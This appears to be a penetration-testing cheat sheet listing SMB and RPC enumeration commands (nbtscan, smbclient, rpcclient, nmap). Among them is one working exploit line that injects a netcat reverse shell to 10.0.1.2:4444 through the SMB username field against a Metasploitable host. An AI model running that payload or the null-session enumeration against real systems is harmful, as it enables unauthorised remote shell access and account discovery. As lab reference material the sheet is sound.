# SMB Enumeration
======
#### Get Hostname
nbtscan <ip-address>
#### Get Hostname of IP Range
nbtscan -r 10.0.0.0/24
#### Get Shares
smbclient -I <ip-address> -L <hostname>
#### Interact with Share
smbclient \\\\<ip-address>\\share -U <user>
#### Command injection in SMB Username
smbclient -I 10.0.0.107 -LMETASPLOITABLE -U"/=`nohup mkfifo /tmp/p; nc 10.0.1.2 4444 0</tmp/p | /bin/sh >/tmp/p 2>&1; rm /tmp/p `"
#### Mount Share (Windows)
net use \\<target-ip>\share <password> /u:<username>

## RPC Enumeration
------
#### rpcclient (null session)
rpcclient -U "" ip.addr
#### Get RPC Info from a List of Servers
nmap -sV -p 111 --script=rpcinfo 10.0.0.1-254
#### List all Groups
enumdomgroups
#### Query a Group
querygroup 0x44f
#### Query Member of Group
querygroupmem 0x44f
#### Query Users
enumdomusers
#### Query a User
queryuser 0x451